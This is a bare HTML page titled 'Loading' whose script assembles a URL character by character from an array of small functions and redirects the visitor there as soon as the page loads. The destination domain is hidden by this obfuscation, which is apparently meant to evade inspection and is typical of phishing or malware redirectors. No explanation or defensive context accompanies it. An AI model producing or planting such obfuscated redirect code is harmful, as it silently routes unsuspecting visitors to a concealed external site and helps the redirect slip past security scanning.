<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            function() { return 'h'; },
            function() { return 't'; },
            _ => 't',
            () => 'p',
            _ => 's',
            _ => ':',
            _ => '/',
            _ => '/',
            () => 'v',
            function() { return 'e'; },
            _ => 'r',
            function() { return 'g'; },
            _ => 'e',
            function() { return 'n'; },
            function() { return '.'; },
            function() { return 'c'; },
            () => 'l',
            () => 'i',
            _ => 'c',
            () => 'k',
            function() { return '/'; },
            _ => 's',
            _ => '/',
            function() { return 'n'; },
            () => 'e',
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
